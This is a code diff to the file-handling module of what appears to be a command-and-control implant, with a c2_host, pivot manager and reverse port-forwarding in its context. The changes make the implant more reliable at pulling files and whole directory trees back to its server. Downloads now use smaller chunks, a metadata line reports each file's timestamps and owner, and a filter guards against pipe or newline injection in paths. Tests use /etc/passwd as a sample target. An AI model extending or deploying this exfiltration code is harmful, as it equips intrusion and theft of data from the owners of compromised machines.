@@ -1,12 +1,11 @@
-// src/agent/handlers/files.rs — File operations, directory listing, artifacts
+// src/agent/handlers/files.rs - File operations, directory listing, artifacts
 //
-// FIXES (2025-07-13):
-//   • handle_file_download_chunked  – all blocking file I/O moved into
+//   • handle_file_download_chunked - all blocking file I/O moved into
 //     tokio::task::spawn_blocking so the async runtime never stalls.
-//   • handle_recursive_download    – same spawn_blocking fix plus:
-//       – chunk size reduced from 8 MB → 2 MB to bound memory per chunk
-//       – cooperative thread-yield between chunks and every 5 files
-//       – uses tokio::sync::mpsc::Sender::blocking_send() from the
+//   • handle_recursive_download - same spawn_blocking fix plus:
+//       - chunk size reduced from 8 MB -> 2 MB to bound memory per chunk
+//       - cooperative thread-yield between chunks and every 5 files
+//       - uses tokio::sync::mpsc::Sender::blocking_send() from the
 //         blocking pool so back-pressure applies without deadlocking.
 
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
@@ -30,13 +29,13 @@ pub fn handle_file_write(cmd: &str) -> (String, String, i32) {
     } else { (String::new(), lc!("Usage: file:write|base_dir|rel_path|b64_data"), 1) }
 }
 
-/// Chunked file write — receives one piece of a file and appends it to disk.
+/// Chunked file write - receives one piece of a file and appends it to disk.
 ///
 /// Wire format (6 pipe-separated fields):
 ///   file:write_chunk|<batch_ts>|<path>|<chunk_idx>|<total_chunks>|<b64_data>
 ///
-/// chunk_idx == 0 → create / truncate the file (first chunk)
-/// chunk_idx > 0  → append to the existing file
+/// chunk_idx == 0 -> create / truncate the file (first chunk)
+/// chunk_idx > 0 -> append to the existing file
 ///
 /// The agent never holds more than one decoded chunk (~8 MB) in memory at once,
 /// matching the download path's per-chunk memory budget.
@@ -91,9 +90,92 @@ pub fn handle_file_write_chunked(cmd: &str) -> (String, String, i32) {
     }
 }
 
+// ── File metadata announcement (RCM spec §4) ──────────────────────────
+//
+// Optional, backward-compatible `file:meta|<batch_ts>|<rel_path>|<abs_path>|<json_b64>`
+// line sent BEFORE the file data it describes. Old servers treat the unknown
+// prefix as ordinary command output (harmless); new servers cache it and use
+// it for the collected-file sidecar. Metadata collection is best-effort: any
+// field that fails to resolve is omitted from the JSON, and if the file cannot
+// be stat'ed at all no meta line is sent (the download itself never fails
+// because of metadata).
+
+/// Convert a SystemTime to an RFC 3339 UTC string, e.g. "2026-07-22T08:11:00.123201Z".
+fn sys_time_to_rfc3339(t: std::time::SystemTime) -> String {
+    let dt: chrono::DateTime<chrono::Utc> = t.into();
+    dt.to_rfc3339_opts(chrono::SecondsFormat::Micros, true)
+}
+
+/// Build the base64-encoded JSON metadata payload for `path`.
+/// Returns None if the file cannot be stat'ed (caller then skips file:meta).
+fn build_file_meta_json(path: &str) -> Option<String> {
+    let md = std::fs::metadata(path).ok()?;
+    let mut map = serde_json::Map::new();
+    if let Ok(t) = md.modified() {
+        map.insert("modified".to_string(), sys_time_to_rfc3339(t).into());
+    }
+    if let Ok(t) = md.accessed() {
+        map.insert("accessed".to_string(), sys_time_to_rfc3339(t).into());
+    }
+    if let Ok(t) = md.created() {
+        map.insert("created".to_string(), sys_time_to_rfc3339(t).into());
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::MetadataExt;
+        map.insert("owner".to_string(), md.uid().to_string().into());
+        map.insert("group".to_string(), md.gid().to_string().into());
+    }
+    Some(BASE64.encode(serde_json::Value::Object(map).to_string()))
+}
+
+/// Wire format: file:meta|<batch_ts>|<rel_path>|<abs_path>|<json_b64>
+/// (`-` for batch_ts on single file:data downloads).
+fn file_meta_line(batch_ts: &str, rel_path: &str, abs_path: &str, json_b64: &str) -> String {
+    format!("file:meta|{}|{}|{}|{}", batch_ts, rel_path, abs_path, json_b64)
+}
+
+/// Wire-framing guard: the download protocols embed paths VERBATIM into
+/// pipe-delimited wire lines, so a path (or filename component) containing
+/// '|', '\n' or '\r' would break framing or inject a spoofed wire line on
+/// the server. Such files are skipped (recorded in failed_downloads) or, for
+/// single-file operations, rejected with an error.
+pub(crate) fn path_breaks_wire_framing(p: &str) -> bool {
+    p.contains('|') || p.contains('\n') || p.contains('\r')
+}
+
+/// Serialize and queue one file:meta announcement through the chunk channel.
+/// Best-effort: silently skipped when metadata is unavailable.
+fn send_file_meta(
+    chunk_tx: &tokio::sync::mpsc::Sender<Vec<u8>>,
+    req_id: u64,
+    batch_ts: &str,
+    rel_path: &str,
+    abs_path: &str,
+) -> Result<(), ()> {
+    if let Some(meta_b64) = build_file_meta_json(abs_path) {
+        let resp = CommandResponse {
+            request_id: req_id,
+            output: file_meta_line(batch_ts, rel_path, abs_path, &meta_b64),
+            error: String::new(),
+            exit_code: 0,
+        };
+        if let Ok(j) = serde_json::to_vec(&resp) {
+            return chunk_tx.blocking_send(j).map_err(|_| ());
+        }
+    }
+    Ok(())
+}
+
 pub fn handle_file_read(cmd: &str) -> (String, String, i32) {
     let parts: Vec<&str> = cmd.splitn(2, '|').collect();
     if parts.len() == 2 {
+        // The path is embedded verbatim into the pipe-delimited file:data
+        // wire line - reject framing-breaking characters.
+        if path_breaks_wire_framing(parts[1]) {
+            return (String::new(),
+                format!("{}: path contains wire-framing characters", lc!("Read error")), 1);
+        }
         match file_transfer::read_file_to_b64(parts[1]) {
             Ok((b64, perms)) => (format!("file:data|{}|{}|{}", parts[1], perms, b64), String::new(), 0),
             Err(e) => (String::new(), e, 1),
@@ -115,7 +197,11 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
     let tx = ctx.tx.clone();
 
     tokio::spawn(async move {
-        const CHUNK_SIZE: u64 = 8 * 1024 * 1024;
+        // 2 MB raw -> ~2.8 MB base64+JSON on the wire, safely under the
+        // server's MAX_FRAME_SIZE (10 MiB). The previous 8 MB chunks
+        // produced ~11 MB frames that the server rejected, killing the
+        // session mid-download. Matches the recursive path below.
+        const CHUNK_SIZE: u64 = 2 * 1024 * 1024;
         const CHUNK_SLEEP_MS: u64 = 50;
 
         let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
@@ -139,6 +225,20 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
 
         let worker = tokio::task::spawn_blocking(move || {
             use std::io::Read as _;
+
+            // The path is embedded verbatim into every file:chunk wire line -
+            // reject framing-breaking characters with an error response.
+            if path_breaks_wire_framing(&path) {
+                let resp = CommandResponse {
+                    request_id: req_id, output: String::new(),
+                    error: "Refusing chunked download: path contains wire-framing characters".to_string(),
+                    exit_code: 1,
+                };
+                if let Ok(j) = serde_json::to_vec(&resp) {
+                    let _ = chunk_tx.blocking_send(j);
+                }
+                return;
+            }
 
             let file_size: u64 = match std::fs::metadata(&path) {
                 Ok(m) => m.len(),
@@ -170,6 +270,13 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
                     return;
                 }
             };
+
+            // RCM spec §4: announce metadata before the first chunk.
+            // abs_path = original absolute `path`; rel_path = exactly the
+            // rel_path used in the file:chunk messages below.
+            if send_file_meta(&chunk_tx, req_id, &batch_ts, &rel_path, &path).is_err() {
+                return;
+            }
 
             let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
             let mut chunk_idx: u64 = 0;
@@ -246,9 +353,9 @@ pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_i
 
 // ── Recursive directory download ───────────────────────────────────────
 //
-// CRITICAL: this path handles directories with 100 000+ files.  Every
+// CRITICAL: this path handles directories with 100 000+ files. Every
 // blocking syscall (read_dir, open, read) now lives inside
-// spawn_blocking.  A bounded Tokio channel (capacity 16) applies
+// spawn_blocking. A bounded Tokio channel (capacity 16) applies
 // back-pressure so the agent does not OOM when the server is slow.
 
 pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
@@ -279,7 +386,21 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
         let worker = tokio::task::spawn_blocking(move || {
             use std::io::Read as _;
 
-            // 1. Enumerate (blocking call — may take seconds on huge trees).
+            // The root path is embedded verbatim into every wire line of
+            // this batch - reject framing-breaking characters outright.
+            if path_breaks_wire_framing(&root_path) {
+                let resp = CommandResponse {
+                    request_id: req_id, output: String::new(),
+                    error: "Refusing recursive download: root path contains wire-framing characters".to_string(),
+                    exit_code: 1,
+                };
+                if let Ok(j) = serde_json::to_vec(&resp) {
+                    let _ = chunk_tx.blocking_send(j);
+                }
+                return;
+            }
+
+            // 1. Enumerate (blocking call - may take seconds on huge trees).
             let (files, _errors) = file_transfer::find_all_files(&root_path);
 
             let mut report = file_transfer::RecursiveReport {
@@ -296,6 +417,17 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                 } else {
                     path_str.clone()
                 };
+
+                // Wire-framing guard: an on-disk filename containing '|' or a
+                // newline would break the pipe-delimited wire format or
+                // inject a spoofed line. Skip the file and record it.
+                if path_breaks_wire_framing(&path_str) {
+                    report.failed_downloads.push((
+                        path_str,
+                        "unsafe filename (| or newline breaks wire framing)".to_string(),
+                    ));
+                    continue;
+                }
 
                 // 2. Stat + open (both blocking).
                 let file_size: u64 = match std::fs::metadata(&path_str) {
@@ -316,6 +448,13 @@ pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: 
                         continue;
                     }
                 };
+
+                // RCM spec §4: announce this file's metadata before its
+                // first chunk. rel_path is the same rel string used in the
+                // file:chunk messages; abs_path is the full target path.
+                if send_file_meta(&chunk_tx, req_id, &batch_ts, &rel_path, &path_str).is_err() {
+                    return;
+                }
 
                 let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
                 let mut chunk_idx: u64 = 0;
@@ -561,7 +700,7 @@ mod tests {
         let dir  = tempfile::tempdir().unwrap();
         let path = dir.path().join("progress.bin").to_string_lossy().to_string();
 
-        // chunk_idx=0, total=3 → not final
+        // chunk_idx=0, total=3 -> not final
         let (msg, _, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 3, b"a"));
         assert_eq!(code, 0);
         assert!(!msg.contains("complete"),
@@ -607,7 +746,7 @@ mod tests {
         let dir  = tempfile::tempdir().unwrap();
         let path = dir.path().join("binary.bin").to_string_lossy().to_string();
 
-        // All 256 byte values — exercises non-UTF-8 content
+        // All 256 byte values - exercises non-UTF-8 content
         let data: Vec<u8> = (0u8..=255).collect();
         let (_, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, &data));
         assert_eq!(code, 0, "err: {}", err);
@@ -634,5 +773,177 @@ mod tests {
         let (_, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, b""));
         assert_eq!(code, 0, "err: {}", err);
         assert_eq!(std::fs::read(&path).unwrap(), b"");
+    }
+
+    // ── file:meta (RCM spec §4) ─────────────────────────────────────────
+
+    #[test]
+    fn meta_json_decodes_with_expected_keys() {
+        let dir  = tempfile::tempdir().unwrap();
+        let path = dir.path().join("meta.bin").to_string_lossy().to_string();
+        std::fs::write(&path, b"meta").unwrap();
+
+        let b64 = build_file_meta_json(&path).expect("meta payload for existing file");
+        let json_bytes = BASE64.decode(&b64).unwrap();
+        let v: serde_json::Value = serde_json::from_slice(&json_bytes).unwrap();
+
+        for key in ["modified", "accessed"] {
+            let ts = v.get(key).and_then(|x| x.as_str())
+                .unwrap_or_else(|| panic!("missing key {}", key));
+            assert!(ts.contains('T') && ts.ends_with('Z'),
+                "{} should be RFC 3339 UTC, got: {}", key, ts);
+        }
+        // created is platform/filesystem-dependent; if present it must be valid.
+        if let Some(ts) = v.get("created").and_then(|x| x.as_str()) {
+            assert!(ts.contains('T') && ts.ends_with('Z'),
+                "created should be RFC 3339 UTC, got: {}", ts);
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn meta_json_owner_group_are_decimal_uid_gid() {
+        use std::os::unix::fs::MetadataExt;
+        let dir  = tempfile::tempdir().unwrap();
+        let path = dir.path().join("own.bin").to_string_lossy().to_string();
+        std::fs::write(&path, b"own").unwrap();
+
+        let b64 = build_file_meta_json(&path).unwrap();
+        let v: serde_json::Value =
+            serde_json::from_slice(&BASE64.decode(&b64).unwrap()).unwrap();
+
+        let md = std::fs::metadata(&path).unwrap();
+        assert_eq!(v.get("owner").and_then(|x| x.as_str()),
+                   Some(md.uid().to_string().as_str()));
+        assert_eq!(v.get("group").and_then(|x| x.as_str()),
+                   Some(md.gid().to_string().as_str()));
+    }
+
+    #[test]
+    fn meta_json_none_for_missing_file() {
+        let dir  = tempfile::tempdir().unwrap();
+        let path = dir.path().join("does_not_exist.bin").to_string_lossy().to_string();
+        assert!(build_file_meta_json(&path).is_none(),
+            "un-stat-able path must yield None (meta skipped, download unaffected)");
+    }
+
+    #[test]
+    fn meta_wire_line_has_five_pipe_separated_fields() {
+        let line = file_meta_line("20260101_120000_000", "etc/passwd", "/etc/passwd", "e30=");
+        let parts: Vec<&str> = line.split('|').collect();
+        assert_eq!(parts.len(), 5, "file:meta line must have exactly 5 fields: {}", line);
+        assert_eq!(parts[0], "file:meta");
+        assert_eq!(parts[1], "20260101_120000_000");
+        assert_eq!(parts[2], "etc/passwd");
+        assert_eq!(parts[3], "/etc/passwd");
+        assert_eq!(parts[4], "e30=");
+    }
+
+    // ── wire-framing guard (pipe/newline injection) ─────────────────────
+
+    #[test]
+    fn framing_guard_flags_pipe_and_newlines() {
+        assert!(path_breaks_wire_framing("evil|name.txt"));
+        assert!(path_breaks_wire_framing("evil\nname.txt"));
+        assert!(path_breaks_wire_framing("evil\rname.txt"));
+        assert!(!path_breaks_wire_framing("normal/file-name_1.txt"));
+        assert!(!path_breaks_wire_framing("C:/Users/x/file.txt"));
+    }
+
+    #[test]
+    fn file_read_rejects_pipe_in_path() {
+        let (_, err, code) = handle_file_read("file:read|/tmp/evil|name.txt");
+        assert_eq!(code, 1);
+        assert!(err.contains("wire-framing"), "got: {}", err);
+    }
+
+    #[test]
+    fn file_read_rejects_newline_in_path() {
+        // A newline in the embedded path would inject a second wire line.
+        let (_, err, code) = handle_file_read("file:read|/tmp/evil\nname.txt");
+        assert_eq!(code, 1);
+        assert!(err.contains("wire-framing"), "got: {}", err);
+    }
+
+    fn test_ctx() -> (HandlerContext, tokio::sync::mpsc::Receiver<Vec<u8>>) {
+        use std::sync::{Arc, Mutex};
+        let (tx, rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
+        let ctx = HandlerContext {
+            proxy_handle: Arc::new(Mutex::new(None)),
+            rportfwd_handles: Arc::new(Mutex::new(Vec::new())),
+            ext_manager: Arc::new(Mutex::new(crate::agent::scripting::ExtensionManager::new())),
+            job_manager: Arc::new(Mutex::new(crate::agent::jobs::JobManager::new(tx.clone()))),
+            c2_host: "127.0.0.1".to_string(),
+            tx: tx.clone(),
+            pivot_mgr: Arc::new(tokio::sync::Mutex::new(crate::agent::pivot::PivotManager::new(tx))),
+        };
+        (ctx, rx)
+    }
+
+    #[tokio::test]
+    async fn chunked_download_rejects_pipe_in_path() {
+        let (ctx, mut rx) = test_ctx();
+        handle_file_download_chunked(&ctx, "file:read|/tmp/evil|name.bin", 7).await;
+        let data = tokio::time::timeout(std::time::Duration::from_secs(5), rx.recv())
+            .await.expect("timed out waiting for error response")
+            .expect("channel closed");
+        let resp: CommandResponse = serde_json::from_slice(&data).unwrap();
+        assert_eq!(resp.exit_code, 1);
+        assert!(resp.error.contains("wire-framing"), "got: {}", resp.error);
+    }
+
+    #[tokio::test]
+    async fn recursive_download_skips_pipe_filenames_and_reports_them() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path().join("rootdir");
+        std::fs::create_dir(&root).unwrap();
+        std::fs::write(root.join("good.txt"), b"ok").unwrap();
+        std::fs::write(root.join("evil|name.txt"), b"bad").unwrap();
+
+        let (ctx, mut rx) = test_ctx();
+        let cmd = format!("file:download_dir|{}", root.to_string_lossy());
+        handle_recursive_download(&ctx, &cmd, 42).await;
+
+        let mut outputs: Vec<String> = Vec::new();
+        let report = loop {
+            let data = tokio::time::timeout(std::time::Duration::from_secs(15), rx.recv())
+                .await.expect("timed out waiting for batch report")
+                .expect("channel closed");
+            let resp: CommandResponse = serde_json::from_slice(&data).unwrap();
+            outputs.push(resp.output.clone());
+            if resp.output.starts_with("file:report_batch|") {
+                break resp.output;
+            }
+        };
+
+        // The skipped file is recorded in failed_downloads …
+        let json = report.splitn(4, '|').nth(3).expect("report json field");
+        let v: serde_json::Value = serde_json::from_str(json).unwrap();
+        assert_eq!(v["total_success"].as_u64().unwrap(), 1);
+        let failed = v["failed_downloads"].as_array().unwrap();
+        assert_eq!(failed.len(), 1);
+        assert!(failed[0][0].as_str().unwrap().contains("evil|name.txt"));
+
+        // … and no file:chunk/meta wire line embeds the raw framing-breaking
+        // filename (the report's JSON string is the only allowed occurrence).
+        for o in &outputs {
+            if o.starts_with("file:chunk|") || o.starts_with("file:meta|") {
+                assert!(!o.contains("evil|name.txt"),
+                    "framing-breaking filename leaked into wire line: {}", o);
+            }
+        }
+    }
+
+    #[test]
+    fn meta_wire_line_b64_payload_never_contains_pipe() {
+        // Guarantees the 5-field wire format holds for real payloads too.
+        let dir  = tempfile::tempdir().unwrap();
+        let path = dir.path().join("pipe.bin").to_string_lossy().to_string();
+        std::fs::write(&path, b"x").unwrap();
+        let b64 = build_file_meta_json(&path).unwrap();
+        let line = file_meta_line("-", &path, &path, &b64);
+        assert_eq!(line.split('|').count(), 5,
+            "real payload must keep 5-field format: {}", line);
+        assert!(line.starts_with("file:meta|"));
     }
 }
